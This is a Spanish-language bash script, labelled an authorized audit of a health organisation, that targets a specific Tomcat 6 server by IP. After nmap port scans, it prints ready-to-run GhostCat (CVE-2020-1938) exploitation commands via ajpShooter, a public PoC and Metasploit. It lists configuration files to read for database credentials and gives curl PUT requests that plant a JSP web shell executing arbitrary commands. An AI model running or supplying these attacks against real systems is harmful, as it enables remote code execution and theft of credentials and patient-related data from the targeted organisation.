#!/bin/bash
# =============================================================================
# GHOSTCAT (CVE-2020-1938) CHECK - Tomcat AJP
# Auditoria Autorizada - Cuidarte Tu Salud
#
# GhostCat permite leer archivos del servidor o incluso RCE via AJP (puerto 8009)
# Afecta Apache Tomcat < 9.0.31, < 8.5.51, < 7.0.100
# Tomcat 6.0.53 es VULNERABLE si AJP esta habilitado
# =============================================================================

TARGET_IP="190.66.24.91"
AJP_PORT="8009"
HIS_PORT="3155"

echo "============================================"
echo " GHOSTCAT CHECK (CVE-2020-1938)"
echo " Target: ${TARGET_IP}"
echo " Tomcat: 6.0.53 (VULNERABLE si AJP activo)"
echo "============================================"

# Paso 1: Verificar si AJP esta abierto
echo ""
echo "[*] Verificando puerto AJP ${AJP_PORT}..."
nmap -sV -p "$AJP_PORT" "$TARGET_IP" 2>/dev/null

echo ""
echo "[*] Tambien verificando puertos AJP alternativos..."
nmap -sV -p 8009,8010,8011,8019,9009 "$TARGET_IP" 2>/dev/null

# Paso 2: Si AJP esta abierto, usar ajpShooter o exploit
echo ""
echo "============================================"
echo " Si AJP esta abierto, ejecutar:"
echo "============================================"
echo ""
echo "# Opcion 1: ajpShooter (Python)"
echo "# pip install ajpShooter"
echo "python3 ajpShooter.py http://${TARGET_IP}:${HIS_PORT} ${AJP_PORT} /WEB-INF/web.xml read"
echo ""
echo "# Opcion 2: Exploit CVE-2020-1938 dedicado"
echo "# git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi.git"
echo "python3 CNVD-2020-10487-Tomcat-Ajp-lfi.py ${TARGET_IP} -p ${AJP_PORT} -f /WEB-INF/web.xml"
echo ""
echo "# Opcion 3: Metasploit"
echo "msfconsole -q -x '"
echo "  use auxiliary/admin/http/tomcat_ghostcat;"
echo "  set RHOSTS ${TARGET_IP};"
echo "  set RPORT ${AJP_PORT};"
echo "  set FILENAME /WEB-INF/web.xml;"
echo "  run;"
echo "  exit'"
echo ""
echo "# Archivos criticos a leer si GhostCat funciona:"
echo "#   /WEB-INF/web.xml          -> Configuracion de la app, servlets, credenciales"
echo "#   /WEB-INF/classes/          -> Clases Java compiladas"
echo "#   /META-INF/context.xml      -> Configuracion de contexto, datasources"
echo "#   /WEB-INF/genexus.properties -> Config de GeneXus (puede tener DB credentials)"
echo "#   /WEB-INF/client.cfg        -> Configuracion del cliente GeneXus"

echo ""
echo "============================================"
echo " OTROS CVEs PARA TOMCAT 6.0.53"
echo "============================================"
echo ""
echo "# CVE-2017-12617 (RCE via PUT)"
echo "curl -X PUT '${TARGET_IP}:${HIS_PORT}/WEBHOSREAL/shell.jsp/' -d '<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>'"
echo ""
echo "# CVE-2017-12615 (Upload JSP via PUT - Windows)"
echo "curl -X PUT '${TARGET_IP}:${HIS_PORT}/WEBHOSREAL/test.jsp::DATA' --data-binary @webshell.jsp"
echo ""
echo "# Verificar si PUT esta habilitado:"
echo "curl -X OPTIONS -D - '${TARGET_IP}:${HIS_PORT}/WEBHOSREAL/'"
echo ""
echo "# Nuclei (automatizado):"
echo "nuclei -u http://${TARGET_IP}:${HIS_PORT} -t cves/2020/CVE-2020-1938.yaml"
echo "nuclei -u http://${TARGET_IP}:${HIS_PORT} -t cves/2017/CVE-2017-12617.yaml"
